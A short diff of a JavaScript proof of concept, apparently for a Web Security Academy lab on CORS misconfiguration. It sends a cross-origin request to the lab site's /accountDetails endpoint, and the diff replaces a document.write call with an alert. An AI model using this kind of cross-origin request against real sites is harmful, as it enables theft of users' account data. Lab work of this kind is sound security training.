@@ -11,7 +11,7 @@ function reqListener() {
 
 function cors() {
   var xhr = new XMLHttpRequest();
-  document.getElementById("report").innerHTML = document.write(":()");
+  document.getElementById("report").innerHTML = alert(":()");
   xhr.onload = function() {
   }
   xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
